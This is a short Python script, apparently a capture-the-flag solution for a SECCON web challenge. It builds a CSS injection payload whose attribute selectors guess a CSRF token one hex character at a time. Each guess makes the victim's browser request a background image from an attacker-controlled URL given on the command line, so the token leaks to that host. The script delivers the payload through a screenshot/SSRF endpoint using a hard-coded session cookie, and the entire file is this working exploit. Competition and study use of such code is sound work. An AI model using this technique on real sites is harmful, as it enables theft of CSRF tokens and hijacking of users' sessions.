import requests
import sys

'''
68f010ebdc64297c463654
73ecd2752fc586f848d59f
'''
csrf = 'd59f'
charset = '0123456789abcdef'
data = ''
for i in charset:
	tmp =  csrf + i
	data += 'input[name=csrf][value*="'+tmp+'"]{background:url("'+sys.argv[1]+'?'+tmp+'");}'

data =  data.encode('base64').replace('\n','')

headers = {"Cookie":"CGISESSID=68f010ebdc64297c463654;"}
url = "http://ghostkingdom.pwn.seccon.jp/?url=http://0.0.0.0/?css="+data+"%26msg=123%26action=msgadm2&action=sshot2"
req = requests.get(url,headers=headers)

print req.text
